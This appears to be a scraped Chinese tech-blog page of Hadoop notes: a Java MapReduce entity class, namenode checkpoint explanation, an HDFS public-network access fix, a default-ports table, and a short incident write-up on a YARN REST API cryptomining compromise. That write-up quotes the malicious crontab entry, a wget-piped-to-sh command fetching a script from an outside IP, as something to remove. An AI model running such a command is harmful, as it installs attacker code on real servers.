class="line">​    <span class="function"><span class="keyword">public</span> <span class="title">CourseEntity</span><span class="params">(String course, <span class="keyword">int</span> score)</span> </span>&#123;</span><br><span class="line">​        <span class="keyword">this</span>.course = course;</span><br><span class="line">​        <span class="keyword">this</span>.score = score;</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    <span class="function"><span class="keyword">public</span> String <span class="title">getCourse</span><span class="params">()</span> </span>&#123;</span><br><span class="line">​        <span class="keyword">return</span> course;</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCourse</span><span class="params">(String course)</span> </span>&#123;</span><br><span class="line">​        <span class="keyword">this</span>.course = course;</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getScore</span><span class="params">()</span> </span>&#123;</span><br><span class="line">​        <span class="keyword">return</span> score;</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setScore</span><span class="params">(<span class="keyword">int</span> score)</span> </span>&#123;</span><br><span class="line">​        <span class="keyword">this</span>.score = score;</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    <span class="meta">@Override</span></span><br><span class="line">​    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">​        <span class="keyword">return</span> course +</span><br><span class="line">​                <span class="string">"\t"</span> + score;</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    <span class="meta">@Override</span></span><br><span class="line">​    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">write</span><span class="params">(DataOutput dataOutput)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">​        dataOutput.writeUTF(course);</span><br><span class="line">​        dataOutput.writeInt(score);</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    <span class="meta">@Override</span></span><br><span class="line">​    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readFields</span><span class="params">(DataInput dataInput)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">​        <span class="keyword">this</span>.course = dataInput.readUTF();</span><br><span class="line">​        <span class="keyword">this</span>.score = dataInput.readInt();</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//排序分组</span></span><br><span class="line">​    <span class="meta">@Override</span></span><br><span class="line">​    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(CourseEntity o)</span> </span>&#123;</span><br><span class="line">​        <span class="keyword">if</span> (!<span class="keyword">this</span>.course.equals(o.getCourse()))&#123;</span><br><span class="line">​            <span class="keyword">return</span> <span class="keyword">this</span>.course.compareTo(o.getCourse());</span><br><span class="line">​        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>.score!=o.getScore())&#123;</span><br><span class="line">​            <span class="keyword">return</span> <span class="keyword">this</span>.score&lt;o.getScore()?-<span class="number">1</span>:<span class="number">1</span>;</span><br><span class="line">​        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">​            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">​        &#125;</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    <span class="meta">@Override</span></span><br><span class="line">​    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">​        <span class="keyword">return</span> <span class="keyword">this</span>.course.hashCode()+<span class="keyword">this</span>.score;</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    <span class="meta">@Override</span></span><br><span class="line">​    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">​        <span class="keyword">if</span>(!(obj <span class="keyword">instanceof</span> CourseEntity))&#123;</span><br><span class="line">​            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">​        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">​            CourseEntity courseEntity= (CourseEntity) obj;</span><br><span class="line">​            <span class="keyword">if</span> (<span class="keyword">this</span>.course.equals(courseEntity.getCourse())&amp;&amp;<span class="keyword">this</span>.score==courseEntity.getScore())&#123;</span><br><span class="line">​                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">​            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">​                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">​            &#125;</span><br><span class="line">​        &#125;</span><br><span class="line">​    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/03/Hadoop/8-yarn 用户导致的被挖矿/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/04/03/Hadoop/8-yarn 用户导致的被挖矿/" itemprop="url">Untitled</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-03T15:15:00+08:00">
                2019-04-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="yarn-用户导致的被挖矿-启用Kerberos认证功能，禁止匿名访问修改8088端口"><a href="#yarn-用户导致的被挖矿-启用Kerberos认证功能，禁止匿名访问修改8088端口" class="headerlink" title="yarn 用户导致的被挖矿 启用Kerberos认证功能，禁止匿名访问修改8088端口"></a><a href="https://www.cnblogs.com/gaoyuechen/p/9455220.html" target="_blank" rel="noopener">yarn 用户导致的被挖矿 启用Kerberos认证功能，禁止匿名访问修改8088端口</a></h1><p>-——</p>
<p>用户为dr.who，问下内部使用人员，都没有任务在跑；</p>
<p>结论：</p>
<p>恭喜你，你中毒了，攻击者利用Hadoop Yarn资源管理系统REST API未授权漏洞对服务器进行攻击，攻击者可以在未授权的情况下远程执行代码的安全问题进行预警</p>
<p>用top命令发现cpu使用了360%多，系统会很卡。</p>
<p>解决办法：</p>
<p>1，通过查看占用cpu高得进程，kill掉此进程</p>
<p>2，检查/tmp和/var/tmp目录，删除java、ppc、w.conf等异常文件</p>
<p>3 ，通过crontab -l 查看有一个<em> </em> <em> </em> * wget -q -O - <a href="http://46.249.38.186/cr.sh" target="_blank" rel="noopener">http://46.249.38.186/cr.sh</a> | sh &gt; /dev/null 2&gt;&amp;1任务，删除此任务</p>
<p>4，排查YARN日志，确认异常的application，删除处理</p>
<p>再通过top验证看是否还有高cpu进程，如果有，kill掉，没有的话应该正常了。</p>
<p>注意：YARN提供有默认开放在8088和8090的REST API（默认前者）允许用户直接通过API进行相关的应用创建、任务提交执行等操作，如果配置不当，REST API将会开放在公网导致未授权访问的问题，那么任何黑客则就均可利用其进行远程命令执行，从而进行挖矿等行为，黑客直接利用开放在8088的REST API提交执行命令，来实现在服务器内下载执行.sh脚本，从而再进一步下载启动挖矿程序达到挖矿的目的，因此注意并启用Kerberos认证功能，禁止匿名访问修改8088端口</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/03/Hadoop/7-namenode文件解析/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/04/03/Hadoop/7-namenode文件解析/" itemprop="url">Untitled</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-03T15:15:00+08:00">
                2019-04-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="namenode文件解析"><a href="#namenode文件解析" class="headerlink" title="namenode文件解析"></a>namenode文件解析</h1><h2 id="1-历史日志文件"><a href="#1-历史日志文件" class="headerlink" title="1.历史日志文件"></a>1.历史日志文件</h2><p>/home/hadoop/data/hadoop/name/current</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-rw-rw-r-- 1 hadoop hadoop      42 Jan 21 10:24 edits_0000000000000000001-0000000000000000002</span><br><span class="line">-rw-rw-r-- 1 hadoop hadoop 1048576 Jan 21 10:24 edits_0000000000000000003-0000000000000000003</span><br><span class="line">-rw-rw-r-- 1 hadoop hadoop      42 Jan 21 10:29 edits_0000000000000000004-0000000000000000005</span><br><span class="line">-rw-rw-r-- 1 hadoop hadoop 1048576 Jan 21 10:29 edits_0000000000000000006-0000000000000000006</span><br><span class="line">-rw-rw-r-- 1 hadoop hadoop      42 Jan 21 11:41 edits_0000000000000000007-0000000000000000008</span><br><span class="line">-rw-rw-r-- 1 hadoop hadoop      42 Jan 21 12:41 edits_0000000000000000009-0000000000000000010</span><br><span class="line">-rw-rw-r-- 1 hadoop hadoop      42 Jan 21 13:41 edits_0000000000000000011-0000000000000000012</span><br><span class="line">-rw-rw-r-- 1 hadoop hadoop      42 Jan 21 14:41 edits_0000000000000000013-0000000000000000014</span><br><span class="line">-rw-rw-r-- 1 hadoop hadoop      42 Jan 21 15:41 edits_0000000000000000015-0000000000000000016</span><br><span class="line">....</span><br><span class="line">-rw-rw-r-- 1 hadoop hadoop      42 Jan 23 11:41 edits_0000000000000000283-0000000000000000284</span><br><span class="line">-rw-rw-r-- 1 hadoop hadoop      42 Jan 23 12:41 edits_0000000000000000285-0000000000000000286</span><br><span class="line">-rw-rw-r-- 1 hadoop hadoop      42 Jan 23 13:41 edits_0000000000000000287-0000000000000000288</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-rw-rw-r-- 1 hadoop hadoop     202 Jan 21 10:16 VERSION</span><br></pre></td></tr></table></figure>
<p>记录客户端对元数据操作的日志，只记录操作日志</p>
<h2 id="2-正在编辑的日志文件"><a href="#2-正在编辑的日志文件" class="headerlink" title="2.正在编辑的日志文件"></a>2.正在编辑的日志文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rw-rw-r-- 1 hadoop hadoop 1048576 Jan 23 13:41 edits_inprogress_0000000000000000289</span><br></pre></td></tr></table></figure>
<p>目前对元数据修改的操作记录日志文件</p>
<h2 id="3-镜像文件"><a href="#3-镜像文件" class="headerlink" title="3.镜像文件"></a>3.镜像文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-rw-rw-r-- 1 hadoop hadoop     796 Jan 23 12:41 fsimage_0000000000000000286</span><br><span class="line">-rw-rw-r-- 1 hadoop hadoop      62 Jan 23 12:41 fsimage_0000000000000000286.md5</span><br><span class="line">-rw-rw-r-- 1 hadoop hadoop     796 Jan 23 13:41 fsimage_0000000000000000288</span><br><span class="line">-rw-rw-r-- 1 hadoop hadoop      62 Jan 23 13:41 fsimage_0000000000000000288.md5</span><br></pre></td></tr></table></figure>
<p>真实的元数据信息经过序列化之后的文件，在集群启动时会疑加载这个文件</p>
<h2 id="4-合并点记录文件"><a href="#4-合并点记录文件" class="headerlink" title="4.合并点记录文件"></a>4.合并点记录文件</h2><p>记录的是下一次需要合并的日志文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rw-rw-r-- 1 hadoop hadoop       4 Jan 23 13:41 seen_txid</span><br></pre></td></tr></table></figure>
<p>secondarynamenode负责合并日志文件</p>
<p>元数据合并过程，即checkpoint过程</p>
<h3 id="1-checkpoint触发条件"><a href="#1-checkpoint触发条件" class="headerlink" title="1.checkpoint触发条件:"></a>1.checkpoint触发条件:</h3><p>1.时间节点,没间隔3600s</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">##hdsf-default.xml</span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.checkpoint.period<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>3600<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>The number of seconds between two periodic checkpoints.</span><br><span class="line">  <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>2.元数据条数 ，100w条</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.checkpoint.txns<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>1000000<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>The Secondary NameNode or CheckpointNode will create a checkpoint</span><br><span class="line">  of the namespace every 'dfs.namenode.checkpoint.txns' transactions, regardless</span><br><span class="line">  of whether 'dfs.namenode.checkpoint.period' has expired.</span><br><span class="line">  <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>两者满足其中一个都会出发checkpoint</p>
<h3 id="2-checkpoint过程"><a href="#2-checkpoint过程" class="headerlink" title="2.checkpoint过程"></a>2.checkpoint过程</h3><p>1.secondarynamenode定期向namenode发送是否需要checkpoint的请求</p>
<p>2.namenode会检查是否满足checkpoint条件，将结果返回给secondarynamenode</p>
<p>3.如果namenode返回可以合并，secondarynamenode则请求 checkpoint</p>
<p>4.namenode将正在编辑的日志文件回滚,即将正在编辑的状态切换为编辑完成状态，同时生成一个新的正在编辑的日志文件edits_inprogress</p>
<p>5.secondarynamenode将历史日志文件和fsimage文件拉取到secondnamenode自己的节点上，如果不是第一次checkpoint，拉取的日志文件是合并点记录的编号到最新的回滚的日志文件的所有日志文件</p>
<p>6.secondarynamenode将fsimage和操作日志文件加载到内存进行合并</p>
<p>7.secondarynamenode将合并完成的fsimage 文件发送给namenode</p>
<p>8.namenode将发送过来的fsimage文件重命名，替换掉原来的fsimage文件</p>
<p><code>secondarynamenode在完成checkpoint后会在磁盘上保留一份fsimage文件,永久保存，为namenode备份</code></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/03/Hadoop/6-外网无法访问HDFS解决方法/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/04/03/Hadoop/6-外网无法访问HDFS解决方法/" itemprop="url">Untitled</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-03T15:15:00+08:00">
                2019-04-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="外网无法访问HDFS解决方法"><a href="#外网无法访问HDFS解决方法" class="headerlink" title="外网无法访问HDFS解决方法"></a>外网无法访问HDFS解决方法</h1><h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><ol>
<li><p>A 云主机是 Linux 环境，搭建 Hadoop 伪分布式，公网 IP：<a href="http://49.4.71.xxx/" target="_blank" rel="noopener">49.4.71.xxx</a>，内网 IP：192.168.0.80，主机名：ruixin4。</p>
</li>
<li><p>Hadoop 配置信息如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>fs.defaultFS<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>hdfs://ruixin4:8020<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
</li>
<li><p>Hosts 文件配置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4</span><br><span class="line">::1         localhost localhost.localdomain localhost6 localhost6.localdomain6</span><br><span class="line">192.168.0.80 ruixin4</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="症状"><a href="#症状" class="headerlink" title="症状"></a>症状</h2><ol>
<li><p>在 A 云主机上开启 HDFS，JPS 查看进程都没有异常，通过 Shell 操作 HDFS 文件也没有问题。</p>
</li>
<li><p>通过浏览器访问 50070 端口管理界面也没有问题。</p>
</li>
<li><p>在本地机器上使用 Java API 操作远程 HDFS 文件，URI 使用公网 IP，代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fileSystem = FileSystem.get(<span class="keyword">new</span> URI(<span class="string">"hdfs://49.4.71.9:8020"</span>), configuration, <span class="string">"hadoop"</span>);</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>可以正常创建文件夹</p>
</li>
<li><p>可以正常创建文件</p>
</li>
<li><p>往创建完文件返回的输出流中写入内容是报如下异常</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">File xxx could only be replicated to <span class="number">0</span> <span class="function">nodes instead of <span class="title">minReplication</span> <span class="params">(=<span class="number">1</span>)</span>.</span></span><br><span class="line"><span class="function">1</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ol>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ol>
<li>本地 Shell 可以正常操作，排除集群搭建和进程没有启动的问题。</li>
<li>我在另一台云主机（B 云主机）中搭建了开发环境，B 主机和 A 主机在同一内网，在 B 中可以正常操作，基本确定了是由于内外网的原因。</li>
<li>查阅资料发现 HDFS 中的文件夹和文件名都是存放在 NameNode 上，操作不需要和 DataNode 通信，因此可以正常创建文件夹和创建文件说明本地和远程 NameNode 通信没有问题。</li>
<li>那么很可能是本地和远程 DataNode 通信有问题</li>
</ol>
<h2 id="猜测"><a href="#猜测" class="headerlink" title="猜测"></a>猜测</h2><p>文件夹和文件名都是存放在 NameNode 上的，我本地可以通过公网访问 NameNode，所以创建文件夹和文件都可以，但是当我写数据的时候，NameNode 和DataNode 是通过内网通信的，NameNode 会返回给我 DataNode 的内网 IP，我本地就访问不了了。</p>
<p>还有一种可能，云服务器没有开放 DataNode 用于数据传输服务端口 默认是 50010。</p>
<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>想办法使本地可以访问到 DataNode。</p>
<p>1.添加一句配置，使 NameNode 返回 DataNode 的主机名而不是 IP：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">configuration.set(<span class="string">"dfs.client.use.datanode.hostname"</span>, <span class="string">"true"</span>);</span><br></pre></td></tr></table></figure>
<p>2.本地可以拿到了 DataNode 的主机名，要访问还需要配置本地 Hosts 映射：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">49.4.71.xxx  ruixin4</span><br></pre></td></tr></table></figure>
<p>3.云服务器打开 50010 端口</p>
<p>结果正常访问操作结果正常访问操作</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/03/Hadoop/5-Hadoop默认端口应用一览/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/04/03/Hadoop/5-Hadoop默认端口应用一览/" itemprop="url">Untitled</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-03T15:15:00+08:00">
                2019-04-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="Hadoop默认端口应用一览"><a href="#Hadoop默认端口应用一览" class="headerlink" title="Hadoop默认端口应用一览"></a>Hadoop默认端口应用一览</h1><p>本文转自：<a href="http://www.sqlparty.com/hadoop%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3%E5%BA%94%E7%94%A8%E4%B8%80%E8%A7%88/" target="_blank" rel="noopener">《Hadoop默认端口应用一览》</a></p>
<p>Hadoop集群的各部分一般都会使用到多个端口，有些是daemon之间进行交互之用，有些是用于RPC访问以及HTTP访问。而随着Hadoop周边组件的增多，完全记不住哪个端口对应哪个应用，特收集记录如此，以便查询。</p>
<p>这里包含我们使用到的组件：HDFS, YARN, HBase, Hive, ZooKeeper。</p>
<table>
<thead>
<tr>
<th>组件</th>
<th>Daemon</th>
<th>端口</th>
<th>配置</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>HDFS</td>
<td>DataNode</td>
<td>50010</td>
<td>dfs.datanode.address</td>
<td>datanode服务端口，用于数据传输</td>
</tr>
<tr>
<td></td>
<td></td>
<td>50075</td>
<td>dfs.datanode.http.address</td>
<td>http服务的端口</td>
</tr>
<tr>
<td></td>
<td></td>
<td>50475</td>
<td>dfs.datanode.https.address</td>
<td>https服务的端口</td>
</tr>
<tr>
<td></td>
<td></td>
<td>50020</td>
<td>dfs.datanode.ipc.address</td>
<td>ipc服务的端口</td>
</tr>
<tr>
<td></td>
<td>NameNode</td>
<td>50070</td>
<td>dfs.namenode.http-address</td>
<td>http服务的端口</td>
</tr>
<tr>
<td></td>
<td></td>
<td>50470</td>
<td>dfs.namenode.https-address</td>
<td>https服务的端口</td>
</tr>
<tr>
<td></td>
<td></td>
<td>8020</td>
<td>fs.defaultFS</td>
<td>接收Client连接的RPC端口，用于获取文件系统metadata信息。</td>
</tr>
<tr>
<td></td>
<td>journalnode</td>
<td>8485</td>
<td>dfs.journalnode.rpc-address</td>
<td>RPC服务</td>
</tr>
<tr>
<td></td>
<td></td>
<td>8480</td>
<td>dfs.journalnode.http-address</td>
<td>HTTP服务</td>
</tr>
<tr>
<td></td>
<td>ZKFC</td>
<td>8019</td>
<td>dfs.ha.zkfc.port</td>
<td>ZooKeeper FailoverController，用于NN HA</td>
</tr>
<tr>
<td>YARN</td>
<td>ResourceManager</td>
<td>8032</td>
<td>yarn.resourcemanager.address</td>
<td>RM的applications manager(ASM)端口</td>
</tr>
<tr>
<td></td>
<td></td>
<td>8030</td>
<td>yarn.resourcemanager.scheduler.address</td>
<td>scheduler组件的IPC端口</td>
</tr>
<tr>
<td></td>
<td></td>
<td>8031</td>
<td>yarn.resourcemanager.resource-tracker.address</td>
<td>IPC</td>
</tr>
<tr>
<td></td>
<td></td>
<td>8033</td>
<td>yarn.resourcemanager.admin.address</td>
<td>IPC</td>
</tr>
<tr>
<td></td>
<td></td>
<td>8088</td>
<td>yarn.resourcemanager.webapp.address</td>
<td>http服务端口</td>
</tr>
<tr>
<td></td>
<td>NodeManager</td>
<td>8040</td>
<td>yarn.nodemanager.localizer.address</td>
<td>localizer IPC</td>
</tr>
<tr>
<td></td>
<td></td>
<td>8042</td>
<td>yarn.nodemanager.webapp.address</td>
<td>http服务端口</td>
</tr>
<tr>
<td></td>
<td></td>
<td>8041</td>
<td>yarn.nodemanager.address</td>
<td>NM中container manager的端口</td>
</tr>
<tr>
<td></td>
<td>JobHistory Server</td>
<td>10020</td>
<td>mapreduce.jobhistory.address</td>
<td>IPC</td>
</tr>
<tr>
<td></td>
<td></td>
<td>19888</td>
<td>mapreduce.jobhistory.webapp.address</td>
<td>http服务端口</td>
</tr>
<tr>
<td>HBase</td>
<td>Master</td>
<td>60000</td>
<td>hbase.master.port</td>
<td>IPC</td>
</tr>
<tr>
<td></td>
<td></td>
<td>60010</td>
<td>hbase.master.info.port</td>
<td>http服务端口</td>
</tr>
<tr>
<td></td>
<td>RegionServer</td>
<td>60020</td>
<td>hbase.regionserver.port</td>
<td>IPC</td>
</tr>
<tr>
<td></td>
<td></td>
<td>60030</td>
<td>hbase.regionserver.info.port</td>
<td>http服务端口</td>
</tr>
<tr>
<td></td>
<td>HQuorumPeer</td>
<td>2181</td>
<td>hbase.zookeeper.property.clientPort</td>
<td>HBase-managed ZK mode，使用独立的ZooKeeper集群则不会启用该端口。</td>
</tr>
<tr>
<td></td>
<td></td>
<td>2888</td>
<td>hbase.zookeeper.peerport</td>
<td>HBase-managed ZK mode，使用独立的ZooKeeper集群则不会启用该端口。</td>
</tr>
<tr>
<td></td>
<td></td>
<td>3888</td>
<td>hbase.zookeeper.leaderport</td>
<td>HBase-managed ZK mode，使用独立的ZooKeeper集群则不会启用该端口。</td>
</tr>
<tr>
<td>Hive</td>
<td>Metastore</td>
<td>9083</td>
<td>/etc/default/hive-metastore中export PORT=<port>来更新默认端口</port></td>
<td></td>
</tr>
<tr>
<td></td>
<td>HiveServer</td>
<td>10000</td>
<td>/etc/hive/conf/hive-env.sh中export HIVE_SERVER2_THRIFT_PORT=<port>来更新默认端口</port></td>
<td></td>
</tr>
<tr>
<td>ZooKeeper</td>
<td>Server</td>
<td>2181</td>
<td>/etc/zookeeper/conf/zoo.cfg中clientPort=<port></port></td>
